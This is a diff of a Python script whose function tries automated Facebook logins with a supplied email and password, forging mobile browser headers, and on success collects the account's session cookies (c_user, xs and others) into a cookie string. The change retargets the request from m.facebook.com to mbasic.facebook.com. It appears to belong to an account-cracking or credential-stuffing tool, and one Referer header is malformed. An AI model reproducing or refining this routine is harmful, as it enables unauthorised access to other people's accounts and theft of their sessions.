@@ -1023,7 +1023,7 @@ def m2(idf,pwv):
    "email":idf,
    "pass":ps,
    "login":"Log In"}
-   header_freefb ={'Host': 'm.facebook.com',
+   header_freefb ={'Host': 'mbasic.facebook.com',
    'Connection': 'keep-alive',
    'Content-Length': '2059',
    'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
@@ -1040,14 +1040,14 @@ def m2(idf,pwv):
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua-platform': '"Android"',
    'Accept': '*/*',
-   'Origin': 'https://m.facebook.com',
+   'Origin': 'https://mbasic.facebook.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
-   'Referer': 'https://m.facebook.com/',
+   'Referer': 'https%3A%2F%2Fbusiness.facebook.com%2F%3Fnav_ref%3Dbizweb_landing_fb_login_button%26biz_login_source%3Dbizweb_landing_fb_login_button&lwv=100',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}#'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post("https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fbusiness.facebook.com%2F%3Fnav_ref%3Dbizweb_landing_fb_login_button%26biz_login_source%3Dbizweb_landing_fb_login_button&lwv=100",data=log_data,headers=header_freefb).text
+   lo = session.post("https://mbasic.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fbusiness.facebook.com%2F%3Fnav_ref%3Dbizweb_landing_fb_login_button%26biz_login_source%3Dbizweb_landing_fb_login_button&lwv=100",data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
